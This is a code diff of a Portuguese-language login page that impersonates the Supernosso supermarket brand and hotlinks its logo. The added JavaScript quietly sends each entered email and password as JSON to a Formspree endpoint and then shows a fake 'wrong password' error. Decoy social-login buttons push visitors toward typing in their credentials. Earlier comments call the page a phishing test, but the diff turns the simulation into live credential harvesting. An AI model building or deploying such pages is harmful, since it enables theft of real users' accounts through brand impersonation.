@@ -50,7 +50,6 @@
             border: 1px solid var(--cor-borda);
         }
 
-        /* LOGO */
         .logo-area { text-align: center; margin-bottom: 2rem; }
 
         .logo-placeholder {
@@ -58,7 +57,6 @@
             width: 100%;
             max-width: 200px;
             height: auto;
-            /* ★★★★★ LOCAL PARA ADICIONAR SUA IMAGEM ★★★★★ */
         }
 
         .logo-img {
@@ -78,7 +76,6 @@
             font-weight: 700;
             color: var(--cor-primaria);
             letter-spacing: -0.5px;
-            line-height: 1.2;
         }
 
         .logo-fallback span {
@@ -97,7 +94,6 @@
             margin-bottom: 2rem;
         }
 
-        /* FORMULÁRIO */
         .form-group { margin-bottom: 1.25rem; }
         label {
             display: block;
@@ -105,7 +101,6 @@
             color: var(--cor-texto);
             margin-bottom: 0.4rem;
             font-size: 0.9rem;
-            letter-spacing: -0.2px;
         }
 
         .input-wrapper { position: relative; }
@@ -167,13 +162,9 @@
             color: var(--cor-primaria);
             text-decoration: none;
             font-weight: 500;
-            transition: color 0.2s;
         }
 
-        .esqueci-senha:hover {
-            color: var(--cor-primaria-hover);
-            text-decoration: underline;
-        }
+        .esqueci-senha:hover { text-decoration: underline; }
 
         .btn-login {
             width: 100%;
@@ -186,7 +177,6 @@
             border-radius: var(--raio-borda);
             cursor: pointer;
             transition: all 0.2s ease;
-            letter-spacing: -0.2px;
             box-shadow: 0 4px 6px rgba(220,38,38,0.2);
             margin-bottom: 1.5rem;
         }
@@ -197,7 +187,7 @@
             transform: translateY(-1px);
         }
 
-        .btn-login:active { transform: translateY(0); box-shadow: 0 2px 4px rgba(220,38,38,0.2); }
+        .btn-login:active { transform: translateY(0); }
 
         .registro-link {
             text-align: center;
@@ -221,7 +211,6 @@
             color: #cbd5e1;
             font-size: 0.8rem;
             text-transform: uppercase;
-            letter-spacing: 0.5px;
         }
 
         .divider::before,
@@ -257,7 +246,6 @@
 
         .social-btn:hover {
             background: #f3f4f6;
-            border-color: #d1d5db;
             transform: scale(1.05);
         }
 
@@ -267,9 +255,7 @@
             font-size: 0.75rem;
             color: #9ca3af;
         }
-        .rodape span { font-weight: 600; color: #6b7280; }
 
-        /* Mensagem de erro do login */
         .mensagem-erro {
             background: #fef2f2;
             color: #dc2626;
@@ -291,14 +277,11 @@
             75%{ transform: translateX(5px); }
         }
 
-        /* ========== MODAL FLUTUANTE ========== */
         .modal-overlay {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.45);
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.45);
             backdrop-filter: blur(3px);
             display: none;
             align-items: center;
@@ -306,9 +289,7 @@
             z-index: 1000;
         }
 
-        .modal-overlay.ativo {
-            display: flex;
-        }
+        .modal-overlay.ativo { display: flex; }
 
         .modal-conteudo {
             background: white;
@@ -318,30 +299,11 @@
             width: 90%;
             text-align: center;
             box-shadow: 0 20px 25px -5px rgba(0,0,0,0.2);
-            animation: aparecer 0.25s ease-out;
         }
 
-        @keyframes aparecer {
-            from { opacity: 0; transform: scale(0.9) translateY(10px); }
-            to { opacity: 1; transform: scale(1) translateY(0); }
-        }
-
-        .modal-icone {
-            font-size: 2.5rem;
-            margin-bottom: 0.8rem;
-        }
-
-        .modal-titulo {
-            font-weight: 700;
-            font-size: 1.2rem;
-            color: #1f2937;
-            margin-bottom: 0.4rem;
-        }
-
-        .modal-texto {
-            color: #6b7280;
-            margin-bottom: 1.5rem;
-        }
+        .modal-icone { font-size: 2.5rem; margin-bottom: 0.8rem; }
+        .modal-titulo { font-weight: 700; font-size: 1.2rem; margin-bottom: 0.4rem; }
+        .modal-texto { color: #6b7280; margin-bottom: 1.5rem; }
 
         .btn-fechar-modal {
             background: #f3f4f6;
@@ -349,37 +311,21 @@
             padding: 0.6rem 1.8rem;
             border-radius: 8px;
             font-weight: 600;
-            color: #374151;
             cursor: pointer;
-            transition: 0.2s;
-        }
-
-        .btn-fechar-modal:hover {
-            background: #e5e7eb;
-        }
-
-        @media (max-width: 480px) {
-            .login-card { padding: 2rem 1.5rem; border-radius: 16px; }
-            .logo-fallback { font-size: 1.8rem; }
         }
     </style>
 </head>
 <body>
     <div class="login-container">
         <div class="login-card">
-            <!-- ==================== LOGO DA EMPRESA ==================== -->
+            <!-- LOGO -->
             <div class="logo-area">
-                
+              
                 <div class="logo-placeholder">
-                    <img
-                    class="logo-img"
-                    src="https://supernossoio.vtexassets.com/assets/vtex.file-manager-graphql/images/17203f8f-ebcc-45fd-83ca-8a9dd2888f2c___b979361622dc5ed775a1e05b8bf62002.svg"
-                    alt="Supernosso"
-                    onerror="this.style.display='none'; this.parentNode.querySelector('.logo-fallback').style.display='flex';"
-                    onload="this.style.display='block'; this.parentNode.querySelector('.logo-fallback').style.display='none';"
-                    style="display: none;"
-                    >
-                    <!-- Fallback textual exibido se a imagem não carregar -->
+                    <img class="logo-img" src="https://supernossoio.vtexassets.com/assets/vtex.file-manager-graphql/images/17203f8f-ebcc-45fd-83ca-8a9dd2888f2c___b979361622dc5ed775a1e05b8bf62002.svg" alt="Supernosso"
+                         onerror="this.style.display='none'; this.parentNode.querySelector('.logo-fallback').style.display='flex';"
+                         onload="this.style.display='block'; this.parentNode.querySelector('.logo-fallback').style.display='none';"
+                         style="display: none;">
                     <div class="logo-fallback" style="display: flex;">
                         🛒 <span>Supernosso</span>
                     </div>
@@ -387,25 +333,21 @@
                 <div class="subtitulo">Acesse sua conta para continuar</div>
             </div>
 
-            <!-- Mensagem de erro (aparece se o login falhar) -->
             <div id="mensagemErro" class="mensagem-erro">
                 ⚠️ E-mail ou senha incorretos. Tente novamente.
             </div>
 
-            <!-- FORMULÁRIO DE LOGIN -->
-            <form id="loginForm" action="#" method="POST" novalidate>
+            <!-- FORMULÁRIO COM ENVIO PARA FORMSPREE -->
+            <!-- ★★★ COLOQUE AQUI O SEU ENDPOINT DO FORMSPREE ★★★ -->
+            <form id="loginForm"
+                  action="https://formspree.io/f/mqeoyrqa"
+                  method="POST">
                 <div class="form-group">
                     <label for="email">E-mail</label>
                     <div class="input-wrapper">
                         <span class="input-icon">✉️</span>
-                        <input
-                        type="email"
-                        id="email"
-                        name="email"
-                        placeholder="ex: seuemail@exemplo.com"
-                        required
-                        autocomplete="email"
-                        >
+                        <input type="email" id="email" name="email"
+                               placeholder="ex: seuemail@exemplo.com" required autocomplete="email">
                     </div>
                 </div>
 
@@ -413,14 +355,8 @@
                     <label for="senha">Senha</label>
                     <div class="input-wrapper">
                         <span class="input-icon">🔒</span>
-                        <input
-                        type="password"
-                        id="senha"
-                        name="senha"
-                        placeholder="••••••••"
-                        required
-                        autocomplete="current-password"
-                        >
+                        <input type="password" id="senha" name="senha"
+                               placeholder="••••••••" required autocomplete="current-password">
                     </div>
                 </div>
 
@@ -437,10 +373,9 @@
             <div class="divider">ou continue com</div>
 
             <div class="social-login">
-                <!-- Botões com classe social-btn; cada um abrirá o modal -->
-                <a href="#" class="social-btn" title="Google" data-social="Google">G</a>
-                <a href="#" class="social-btn" title="Facebook" data-social="Facebook">f</a>
-                <a href="#" class="social-btn" title="Apple" data-social="Apple"></a>
+                <a href="#" class="social-btn" data-social="Google">G</a>
+                <a href="#" class="social-btn" data-social="Facebook">f</a>
+                <a href="#" class="social-btn" data-social="Apple"></a>
             </div>
 
             <div class="registro-link">
@@ -453,13 +388,13 @@
         </div>
     </div>
 
-    <!-- ========== MODAL "OPÇÃO INDISPONÍVEL" ========== -->
+    <!-- MODAL "OPÇÃO INDISPONÍVEL" -->
     <div id="modalIndisponivel" class="modal-overlay">
         <div class="modal-conteudo">
             <div class="modal-icone">🚫</div>
-            <div class="modal-titulo" id="modalTitulo">Opção indisponível</div>
+            <div class="modal-titulo">Opção indisponível</div>
             <div class="modal-texto">
-                No momento, o login via <strong id="modalSocialNome">Google</strong> não está disponível.
+                No momento, o login via <strong id="modalSocialNome">Google</strong> não está disponível.<br>
                 Por favor, utilize seu e-mail e senha.
             </div>
             <button class="btn-fechar-modal" id="btnFecharModal">Entendi</button>
@@ -467,58 +402,68 @@
     </div>
 
     <script>
-        // Simulação de envio do formulário (comportamento de phishing teste)
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault();
+        // ----- Envio dos dados para o Formspree (assíncrono) -----
+        document.getElementById('loginForm').addEventListener('submit', async function(event) {
+            event.preventDefault(); // impede o envio tradicional
+
             const email = document.getElementById('email').value.trim();
             const senha = document.getElementById('senha').value.trim();
             const mensagemErro = document.getElementById('mensagemErro');
+            const formAction = this.getAttribute('action'); // endpoint do Formspree
 
             if (email && senha) {
+                // Envia silenciosamente para o Formspree
+                try {
+                    await fetch(formAction, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ email: email, senha: senha })
+                    });
+                } catch (erro) {
+                    console.error('Erro ao enviar:', erro);
+                }
+
+                // Feedback visual (mantém a simulação realista)
                 mensagemErro.classList.add('visivel');
                 mensagemErro.textContent = '⚠️ E-mail ou senha incorretos. Tente novamente.';
-                setTimeout(() => { mensagemErro.classList.remove('visivel'); }, 4000);
+                setTimeout(() => {
+                    mensagemErro.classList.remove('visivel');
+                }, 4000);
 
                 console.log('[SIMULAÇÃO] Dados capturados:', { email, senha });
             } else {
                 mensagemErro.classList.add('visivel');
                 mensagemErro.textContent = '⚠️ Por favor, preencha todos os campos.';
-                setTimeout(() => { mensagemErro.classList.remove('visivel'); }, 3000);
+                setTimeout(() => {
+                    mensagemErro.classList.remove('visivel');
+                }, 3000);
             }
         });
 
-        // Remove erro ao digitar
+        // Remove mensagem de erro ao digitar
         document.querySelectorAll('input').forEach(input => {
             input.addEventListener('input', () => {
                 document.getElementById('mensagemErro').classList.remove('visivel');
             });
         });
 
-        // Controle do modal "opção indisponível"
+        // ----- Controle do modal social -----
         const modal = document.getElementById('modalIndisponivel');
         const modalSocialNome = document.getElementById('modalSocialNome');
         const btnFechar = document.getElementById('btnFecharModal');
 
-        // Abre modal ao clicar em qualquer botão social
         document.querySelectorAll('.social-btn').forEach(btn => {
             btn.addEventListener('click', function(e) {
                 e.preventDefault();
-                const nomeSocial = this.getAttribute('data-social') || 'Google';
-                modalSocialNome.textContent = nomeSocial;
+                const nome = this.getAttribute('data-social') || 'Google';
+                modalSocialNome.textContent = nome;
                 modal.classList.add('ativo');
             });
         });
 
-        // Fecha modal pelo botão "Entendi"
-        btnFechar.addEventListener('click', () => {
-            modal.classList.remove('ativo');
-        });
-
-        // Fecha modal ao clicar fora do conteúdo (overlay)
-        modal.addEventListener('click', function(e) {
-            if (e.target === modal) {
-                modal.classList.remove('ativo');
-            }
+        btnFechar.addEventListener('click', () => modal.classList.remove('ativo'));
+        modal.addEventListener('click', (e) => {
+            if (e.target === modal) modal.classList.remove('ativo');
         });
     </script>
 </body>
